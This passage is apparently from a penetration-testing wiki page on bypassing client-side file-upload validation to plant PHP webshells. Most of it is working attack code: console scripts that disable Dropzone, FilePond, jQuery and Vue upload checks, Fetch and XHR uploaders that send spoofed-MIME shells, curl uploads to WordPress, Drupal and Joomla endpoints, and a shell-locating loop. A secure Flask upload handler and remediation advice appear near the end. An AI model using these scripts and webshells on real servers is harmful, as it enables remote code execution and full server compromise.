  // Angular uses FormGroup validators and HttpClient
  // Validators run client-side only

  // Override Angular form validity:
  document.querySelectorAll('form').forEach(form => {
      const ngForm = form.__ngContext__;
      if (ngForm) {
          console.log('[+] Angular form detected');
      }
  });

  // Angular bypass: Just use cURL to call the API endpoint directly
  // Angular's HttpClient calls are just regular HTTP requests

  // ── Vue.js ──
  // Vue uses v-model binding and computed validators
  // Override Vue component data:

  // Find Vue instance
  const vueApp = document.querySelector('#app').__vue__;
  if (vueApp) {
      // Override validation methods
      if (vueApp.validateFile) {
          vueApp.validateFile = () => true;
          console.log('[+] Vue validateFile overridden');
      }
      if (vueApp.isValidType) {
          vueApp.isValidType = () => true;
          console.log('[+] Vue isValidType overridden');
      }
  }

  // ── For ALL frameworks: ──
  // The most reliable bypass is to use Burp Suite or cURL
  // to send the HTTP request directly to the API endpoint.
  // Framework validators are JavaScript-only and cannot affect
  // direct HTTP requests.
  ```
  :::

  :::accordion-item{icon="i-lucide-component" label="Dropzone.js Bypass"}
  ```javascript
  // ═══════════════════════════════════════════════
  // Dropzone.js — Common drag-and-drop upload library
  // ═══════════════════════════════════════════════

  // Dropzone validates files client-side before upload
  // Common restrictions:
  //   acceptedFiles: ".jpg,.jpeg,.png,.gif"
  //   maxFilesize: 5  (in MB)
  //   maxFiles: 1

  // ── Method 1: Override Dropzone options ──
  if (typeof Dropzone !== 'undefined') {
      // Find all Dropzone instances
      document.querySelectorAll('.dropzone, [class*="dropzone"]').forEach(el => {
          if (el.dropzone) {
              el.dropzone.options.acceptedFiles = null;
              el.dropzone.options.maxFilesize = 999999;
              el.dropzone.options.maxFiles = 999;
              el.dropzone.options.dictInvalidFileType = '';
              console.log('[+] Dropzone restrictions removed');
          }
      });
  }

  // ── Method 2: Override the accept function ──
  if (typeof Dropzone !== 'undefined') {
      Dropzone.prototype.accept = function(file, done) {
          done(); // Always accept
      };
  }

  // ── Method 3: Override file type check ──
  if (typeof Dropzone !== 'undefined') {
      Dropzone.isValidFile = function() { return true; };
  }

  // ── Method 4: Manually add file to Dropzone ──
  // Create a fake File object
  const phpFile = new File(
      ['<?php system($_GET["cmd"]); ?>'],
      'shell.php',
      { type: 'image/jpeg' }  // Lie about MIME type
  );

  // Add to Dropzone (if instance accessible)
  const dz = document.querySelector('.dropzone').dropzone;
  if (dz) {
      dz.addFile(phpFile);
      console.log('[+] PHP file added to Dropzone');
  }
  ```
  :::

  :::accordion-item{icon="i-lucide-component" label="jQuery File Upload / Fine Uploader"}
  ```javascript
  // ═══════════════════════════════════════════════
  // jQuery File Upload / blueimp bypass
  // ═══════════════════════════════════════════════

  // Override acceptFileTypes
  if (typeof $.fn.fileupload !== 'undefined') {
      $('input[type="file"]').fileupload('option', {
          acceptFileTypes: /.*$/i,  // Accept everything
          maxFileSize: undefined,
          maxNumberOfFiles: undefined,
      });
      console.log('[+] jQuery File Upload restrictions removed');
  }

  // ═══════════════════════════════════════════════
  // Fine Uploader bypass
  // ═══════════════════════════════════════════════

  if (typeof qq !== 'undefined' && typeof qq.FineUploader !== 'undefined') {
      // Override validation
      qq.FineUploader.prototype._isAllowedExtension = function() { return true; };
      console.log('[+] Fine Uploader extension check disabled');
  }

  // ═══════════════════════════════════════════════
  // FilePond bypass
  // ═══════════════════════════════════════════════

  if (typeof FilePond !== 'undefined') {
      // Remove file type validation plugin
      document.querySelectorAll('.filepond--root').forEach(el => {
          const pond = FilePond.find(el);
          if (pond) {
              pond.acceptedFileTypes = null;
              pond.maxFileSize = null;
              pond.allowFileTypeValidation = false;
              console.log('[+] FilePond restrictions removed');
          }
      });
  }

  // ═══════════════════════════════════════════════
  // Uppy bypass
  // ═══════════════════════════════════════════════

  // Uppy typically uses restrictions in its options
  // Override by accessing the Uppy instance
  if (typeof Uppy !== 'undefined') {
      console.log('[+] Uppy detected — bypass via Burp intercept');
  }
  ```
  :::

  :::accordion-item{icon="i-lucide-component" label="WordPress / CMS Bypass"}
  ```bash
  # ═══════════════════════════════════════════════
  # CMS-specific client-side bypass
  # ═══════════════════════════════════════════════

  # ── WordPress ──
  # WordPress media uploader uses plupload with client-side MIME check
  # Backend also validates, but wp_check_filetype() can be incomplete

  # Direct API upload bypassing media library UI
  curl -X POST "https://target.com/wp-json/wp/v2/media" \
    -H "Cookie: wordpress_logged_in_xxx=COOKIE_VALUE" \
    -H "X-WP-Nonce: NONCE_VALUE" \
    -F "file=@shell.php;filename=shell.php;type=image/jpeg"

  # Via async-upload.php (older WordPress)
  curl -X POST "https://target.com/wp-admin/async-upload.php" \
    -H "Cookie: wordpress_logged_in_xxx=COOKIE_VALUE" \
    -F "async-upload=@shell.php;filename=shell.php;type=image/jpeg" \
    -F "name=shell.php" \
    -F "_wpnonce=NONCE_VALUE" \
    -F "action=upload-attachment"

  # ── Drupal ──
  curl -X POST "https://target.com/file/ajax/field_image/und/form-TOKEN" \
    -H "Cookie: SESS123=SESSION_VALUE" \
    -F "files[field_image_und_0]=@shell.php;type=image/jpeg"

  # ── Joomla ──
  curl -X POST "https://target.com/administrator/index.php?option=com_media&task=file.upload" \
    -H "Cookie: JSESSION=VALUE" \
    -F "Filedata[]=@shell.php;filename=shell.php;type=image/jpeg"

  # ── CKEditor / TinyMCE file upload ──
  curl -X POST "https://target.com/ckeditor/upload" \
    -F "upload=@shell.php;filename=shell.php;type=image/jpeg"

  curl -X POST "https://target.com/tinymce/upload" \
    -F "file=@shell.php;filename=shell.php;type=image/jpeg"
  ```
  :::
::

### Method 5 — Advanced Techniques

::tabs
  :::tabs-item{icon="i-lucide-wand" label="Fetch API Replay"}
  ```javascript
  // ═══════════════════════════════════════════════
  // Use the browser's Fetch API from Console
  // to send upload requests directly, bypassing UI validation
  // ═══════════════════════════════════════════════

  // ── Upload PHP shell via Fetch API ──
  async function uploadShell() {
      const phpCode = '<?php system($_GET["cmd"]); ?>';
      const file = new File([phpCode], 'shell.php', { type: 'image/jpeg' });

      const formData = new FormData();
      formData.append('file', file);

      // Include CSRF token if needed
      const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content
          || document.querySelector('input[name="_token"]')?.value
          || document.querySelector('input[name="csrf_token"]')?.value
          || '';

      if (csrfToken) {
          formData.append('_token', csrfToken);
      }

      try {
          const response = await fetch('/api/upload', {
              method: 'POST',
              body: formData,
              credentials: 'include',  // Include cookies
              headers: {
                  'X-Requested-With': 'XMLHttpRequest',
                  // Don't set Content-Type — browser sets it with boundary
              }
          });

          const result = await response.text();
          console.log(`Status: ${response.status}`);
          console.log(`Response: ${result}`);

          if (response.ok) {
              console.log('[+] Upload successful! Check /uploads/shell.php?cmd=id');
          }
      } catch (e) {
          console.error('Upload failed:', e);
      }
  }

  uploadShell();

  // ── Upload with spoofed MIME type via Blob ──
  async function uploadSpoofedBlob() {
      const phpCode = '<?php system($_GET["cmd"]); ?>';

      // Create Blob with image MIME type but PHP content
      const blob = new Blob([phpCode], { type: 'image/jpeg' });

      // Create File from Blob with .php extension
      const file = new File([blob], 'shell.php', { type: 'image/jpeg' });

      const formData = new FormData();
      formData.append('file', file);

      const response = await fetch('/api/upload', {
          method: 'POST',
          body: formData,
          credentials: 'include',
      });

      console.log('Status:', response.status);
      console.log('Response:', await response.text());
  }

  uploadSpoofedBlob();

  // ── Upload multiple shells at once ──
  async function uploadMultiple() {
      const shells = {
          'shell.php': '<?php system($_GET["cmd"]); ?>',
          'shell.phtml': '<?php system($_GET["cmd"]); ?>',
          'shell.php5': '<?php system($_GET["cmd"]); ?>',
          '.htaccess': 'AddType application/x-httpd-php .jpg',
          'shell.jpg': '<?php system($_GET["cmd"]); ?>',
      };

      for (const [filename, content] of Object.entries(shells)) {
          const formData = new FormData();
          formData.append('file', new File([content], filename, { type: 'image/jpeg' }));

          try {
              const r = await fetch('/api/upload', {
                  method: 'POST', body: formData, credentials: 'include'
              });
              console.log(`${filename}: [${r.status}]`);
          } catch (e) {
              console.log(`${filename}: ERROR`);
          }
      }
  }

  uploadMultiple();
  ```
  :::

  :::tabs-item{icon="i-lucide-wand" label="XMLHttpRequest Replay"}
  ```javascript
  // ═══════════════════════════════════════════════
  // Use XMLHttpRequest from Console
  // Gives more control over headers and response handling
  // ═══════════════════════════════════════════════

  function uploadViaXHR(filename, content, onComplete) {
      const xhr = new XMLHttpRequest();
      const formData = new FormData();

      // Create file with spoofed type
      const file = new File([content], filename, { type: 'image/jpeg' });
      formData.append('file', file);

      // Add CSRF token if present
      const csrf = document.querySelector('[name="csrf_token"],[name="_token"],[name="__RequestVerificationToken"]');
      if (csrf) formData.append(csrf.name, csrf.value);

      xhr.open('POST', '/api/upload', true);
      xhr.withCredentials = true;
      xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');

      xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
              console.log(`[${xhr.status}] ${filename}: ${xhr.responseText.substring(0, 200)}`);
              if (onComplete) onComplete(xhr.status, xhr.responseText);
          }
      };

      xhr.send(formData);
  }

  // Upload PHP shell
  uploadViaXHR('shell.php', '<?php system($_GET["cmd"]); ?>');

  // Upload with progress monitoring
  function uploadWithProgress(filename, content) {
      const xhr = new XMLHttpRequest();
      const formData = new FormData();
      formData.append('file', new File([content], filename, { type: 'image/jpeg' }));

      xhr.upload.onprogress = function(e) {
          if (e.lengthComputable) {
              console.log(`Upload: ${Math.round(e.loaded/e.total*100)}%`);
          }
      };

      xhr.open('POST', '/api/upload', true);
      xhr.withCredentials = true;
      xhr.onload = function() {
          console.log(`Complete: [${xhr.status}] ${xhr.responseText.substring(0, 200)}`);
      };
      xhr.send(formData);
  }

  uploadWithProgress('shell.php', '<?php system($_GET["cmd"]); ?>');
  ```
  :::

  :::tabs-item{icon="i-lucide-wand" label="Programmatic Form Submission"}
  ```javascript
  // ═══════════════════════════════════════════════
  // Create and submit a form programmatically
  // Bypasses existing form's JavaScript validation
  // ═══════════════════════════════════════════════

  function createUploadForm(url, fieldName, filename, content) {
      // Create a hidden form
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = url;
      form.enctype = 'multipart/form-data';
      form.style.display = 'none';

      // Create file input
      const fileInput = document.createElement('input');
      fileInput.type = 'file';
      fileInput.name = fieldName;

      // Create a DataTransfer to programmatically set files
      const dataTransfer = new DataTransfer();
      const file = new File([content], filename, { type: 'image/jpeg' });
      dataTransfer.items.add(file);
      fileInput.files = dataTransfer.files;

      form.appendChild(fileInput);

      // Add CSRF token if exists
      const csrfInput = document.querySelector('input[name="_token"],input[name="csrf_token"]');
      if (csrfInput) {
          const tokenField = document.createElement('input');
          tokenField.type = 'hidden';
          tokenField.name = csrfInput.name;
          tokenField.value = csrfInput.value;
          form.appendChild(tokenField);
      }

      document.body.appendChild(form);
      form.submit();
  }

  // Use it
  createUploadForm(
      '/api/upload',
      'file',
      'shell.php',
      '<?php system($_GET["cmd"]); ?>'
  );
  ```
  :::
::

---

## Comprehensive Exploit Workflow

::steps{level="4"}

#### Step 1 — Identify Validation Type

```bash
# Test if any HTTP request is sent when uploading a blocked file type
# Open DevTools Network tab → Upload a .php file
# If NO request appears → 100% client-side validation

# Quick automated test:
curl -s -o /dev/null -w "%{http_code}" -X POST "https://target.com/api/upload" \
  -F "file=@shell.php;filename=shell.php;type=image/jpeg" \
  -H "Cookie: session=TOKEN"
# 200 = client-side only (accepted!)
# 400/403/415 = server-side validation exists too
```

#### Step 2 — Bypass Client-Side and Upload Shell

```bash
# Direct upload via cURL (no browser involved)
echo '<?php echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>"; ?>' > shell.php

curl -X POST "https://target.com/api/upload" \
  -F "file=@shell.php;filename=shell.php;type=image/jpeg" \
  -H "Cookie: session=TOKEN" -v
```

#### Step 3 — Locate Uploaded File

```bash
# Check response for upload path
# Brute force common directories
for dir in uploads files media images static content tmp; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${dir}/shell.php")
    [ "$STATUS" != "404" ] && echo "[${STATUS}] https://target.com/${dir}/shell.php"
done
```

#### Step 4 — Verify Code Execution

```bash
# Access the shell
curl -s "https://target.com/uploads/shell.php?cmd=id"
curl -s "https://target.com/uploads/shell.php?cmd=whoami"

# If executed → FULL RCE via client-side-only validation bypass
```

::

---

## Vulnerable Code Patterns

::code-tree{default-value="html_only.html"}
```html [html_only.html]
<!-- VULNERABLE — HTML accept attribute is cosmetic only -->
<form action="/api/upload" method="POST" enctype="multipart/form-data">
    <!-- accept= only affects file picker dialog, NOT security -->
    <input type="file" name="file" accept=".jpg,.jpeg,.png,.gif">
    <input type="hidden" name="MAX_FILE_SIZE" value="5000000">
    <button type="submit">Upload</button>
</form>
```

```javascript [js_validation.js]
// VULNERABLE — Client-side JavaScript validation
document.getElementById('uploadForm').addEventListener('submit', function(e) {
    const file = document.getElementById('fileInput').files[0];

    // Extension check (client-side only)
    const allowedExts = ['.jpg', '.jpeg', '.png', '.gif'];
    const ext = file.name.substring(file.name.lastIndexOf('.'));
    if (!allowedExts.includes(ext.toLowerCase())) {
        e.preventDefault();  // Blocks form submission in browser
        alert('Only image files allowed!');
        return false;  // Attacker: just uses cURL instead
    }

    // MIME type check (client-side only)
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if (!allowedTypes.includes(file.type)) {
        e.preventDefault();
        alert('Invalid file type!');
        return false;  // Attacker: spoofs Content-Type header
    }

    // Size check (client-side only)
    if (file.size > 5 * 1024 * 1024) {
        e.preventDefault();
        alert('File too large!');
        return false;  // Attacker: server has no size limit
    }
});
```

```python [server_no_validation.py]
# VULNERABLE — Server has NO validation
# Relies entirely on client-side JavaScript checks

from flask import Flask, request
import os

@app.route('/api/upload', methods=['POST'])
def upload():
    f = request.files['file']
    # NO extension check
    # NO content validation
    # NO size check
    # NO filename sanitization
    f.save(os.path.join('uploads', f.filename))  # Saves whatever is sent
    return {'status': 'success', 'path': f'/uploads/{f.filename}'}
```

```php [server_no_validation.php]
<?php
// VULNERABLE — No server-side validation whatsoever
// "JavaScript handles the validation"
if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $dest = 'uploads/' . $_FILES['file']['name'];
    move_uploaded_file($_FILES['file']['tmp_name'], $dest);
    echo json_encode(['status' => 'success', 'path' => $dest]);
}
?>
```
::

### Secure Implementation

::code-collapse
```python [secure_upload.py]
# ═══════════════════════════════════════════
# SECURE — Server-side validation (client-side is UX only)
# ═══════════════════════════════════════════

import os
import secrets
import magic  # python-magic library
from PIL import Image
from flask import Flask, request, jsonify

UPLOAD_DIR = '/var/uploads/'  # Outside web root
ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'webp'}
ALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB
MAX_DIMENSIONS = (4096, 4096)

@app.route('/api/upload', methods=['POST'])
def secure_upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400

    f = request.files['file']

    # 1. Server-side size check
    f.seek(0, 2)
    size = f.tell()
    f.seek(0)
    if size > MAX_FILE_SIZE:
        return jsonify({'error': 'File too large'}), 413

    # 2. Extension whitelist (case-insensitive)
    ext = os.path.splitext(f.filename)[1].lower().lstrip('.')
    if ext not in ALLOWED_EXTENSIONS:
        return jsonify({'error': 'Extension not allowed'}), 400

    # 3. MIME type validation (from file content, not header)
    mime = magic.from_buffer(f.read(2048), mime=True)
    f.seek(0)
    if mime not in ALLOWED_MIMES:
        return jsonify({'error': 'Invalid file content'}), 400

    # 4. Image validation (actually try to open and verify)
    try:
        img = Image.open(f)
        img.verify()
        f.seek(0)
        img = Image.open(f)
        if img.size[0] > MAX_DIMENSIONS[0] or img.size[1] > MAX_DIMENSIONS[1]:
            return jsonify({'error': 'Image too large'}), 400
    except Exception:
        return jsonify({'error': 'Invalid image'}), 400
    f.seek(0)

    # 5. Generate random filename (prevents extension tricks)
    safe_name = secrets.token_hex(16) + '.' + ext

    # 6. Save outside web root
    save_path = os.path.join(UPLOAD_DIR, safe_name)
    f.save(save_path)

    # 7. Re-encode image (strips any embedded code)
    try:
        img = Image.open(save_path)
        clean_path = save_path + '.clean'
        img.save(clean_path, format=img.format)
        os.replace(clean_path, save_path)
    except Exception:
        os.remove(save_path)
        return jsonify({'error': 'Processing failed'}), 500

    return jsonify({'status': 'success', 'filename': safe_name})
```
::

---

## Reporting & Remediation

### Bug Bounty Report

::steps{level="4"}

#### Title
`Remote Code Execution via Client-Side-Only File Upload Validation at [endpoint]`

#### Description
The file upload at `POST /api/upload` relies exclusively on JavaScript validation in the browser to restrict uploaded file types to images. No server-side validation exists. By sending the upload request directly via cURL (or intercepting with Burp Suite), all client-side checks are bypassed and arbitrary files including PHP webshells are accepted and executed by the server.

#### Steps to Reproduce
```bash
# 1. Create webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 2. Upload directly via cURL (bypasses all JavaScript validation)
curl -X POST "https://target.com/api/upload" \
  -F "file=@shell.php;filename=shell.php;type=image/jpeg" \
  -H "Cookie: session=AUTH_TOKEN"

# 3. Access the webshell
curl "https://target.com/uploads/shell.php?cmd=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Impact
Any authenticated user can upload and execute arbitrary code on the server, leading to complete server compromise.

::

### Remediation

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Always Validate Server-Side
  ---
  Client-side validation is for **user experience only**. Every check must be duplicated on the server: extension whitelist, MIME type verification from content (not headers), file size limits, and content analysis.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Never Trust Client Data
  ---
  The filename, Content-Type header, and file content in the HTTP request are all attacker-controlled. Validate the actual file bytes on the server using libraries like `python-magic`, `finfo_file()` (PHP), or `ImageIO` (Java).
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Use a Whitelist Approach
  ---
  Allow only specific, known-safe extensions (`.jpg`, `.png`, `.gif`). Use case-insensitive comparison. Generate random filenames server-side to prevent all extension manipulation attacks.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Re-encode Uploaded Images
  ---
  Process uploaded images through an image library (Pillow, GD, ImageMagick) and save a new, clean copy. This strips any embedded code from metadata, comments, or pixel data.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Store Outside Web Root
  ---
  Save uploaded files in a directory that is not directly accessible via HTTP. Serve them through a proxy script that sets appropriate Content-Type and Content-Disposition headers.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Disable Script Execution
  ---
  Configure the web server to never execute scripts in the upload directory. Apache: `php_flag engine off`. Nginx: don't pass upload directory to PHP-FPM. IIS: remove all script handlers.
  :::
::

---

## References & Resources

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-602 — Client-Side Enforcement of Server-Side Security
  to: https://cwe.mitre.org/data/definitions/602.html
  target: _blank
  ---
  MITRE CWE entry specifically addressing the flaw of relying on client-side enforcement for security-critical operations.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — Unrestricted File Upload
  to: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  target: _blank
  ---
  OWASP guide covering file upload vulnerabilities including client-side validation bypass and server-side defense requirements.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — File Upload Vulnerabilities
  to: https://portswigger.net/web-security/file-upload
  target: _blank
  ---
  Interactive labs covering client-side bypass techniques with step-by-step solutions using Burp Suite.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — File Upload
  to: https://book.hacktricks.wiki/en/pentesting-web/file-upload/
  target: _blank
  ---
  Comprehensive cheatsheet covering client-side bypass, Burp intercept techniques, and all major upload filter bypass methods.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — Input Validation Cheat Sheet
  to: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
  target: _blank
  ---
  OWASP guidance on proper input validation emphasizing that validation must always be performed server-side.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PayloadsAllTheThings — Upload Insecure Files
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
  target: _blank
  ---
  Community repository with file upload bypass payloads including client-side bypass examples and webshell collections.
  :::
::

---

## Quick Reference Cheatsheet

::field-group
  :::field{name="cURL direct upload (bypass ALL JS)" type="command"}
  `curl -X POST https://target.com/upload -F "file=@shell.php;filename=shell.php;type=image/jpeg" -H "Cookie: session=TOKEN"`
  :::

  :::field{name="Detect client-side-only validation" type="command"}
  Upload `.php` via cURL — if `200` with no server error → client-side only
  :::

  :::field{name="Remove HTML accept attribute" type="command"}
  Console: `document.querySelectorAll('input[type=file]').forEach(i=>i.removeAttribute('accept'))`
  :::

  :::field{name="Disable JS validation" type="command"}
  Console: `document.querySelectorAll('form').forEach(f=>{f.onsubmit=null;f.removeAttribute('onsubmit')})`
  :::

  :::field{name="Disable JS entirely (Chrome)" type="command"}
  F12 → Ctrl+Shift+P → `Disable JavaScript` → Refresh → Upload
  :::

  :::field{name="Override Dropzone" type="command"}
  Console: `Dropzone.prototype.accept=function(f,d){d()}`
  :::

  :::field{name="Fetch API upload from Console" type="command"}
  `fetch('/api/upload',{method:'POST',body:(()=>{let f=new FormData();f.append('file',new File(['<?php system($_GET["cmd"]); ?>'],'shell.php',{type:'image/jpeg'}));return f})(),credentials:'include'})`
  :::

  :::field{name="Burp intercept workflow" type="command"}
  Upload valid `.jpg` → Burp intercepts → change `filename=photo.jpg` to `filename=shell.php` → change body to PHP code → Forward
  :::

  :::field{name="Verify upload execution" type="command"}
  `curl -s "https://target.com/uploads/shell.php?cmd=id"`
  :::

  :::field{name="Python direct upload" type="command"}
  `python3 -c "import requests; requests.post('URL', files={'file':('shell.php',b'<?php system(\$_GET[\"cmd\"]); ?>','image/jpeg')}, cookies={'session':'TOKEN'}, verify=False)"`
  :::
::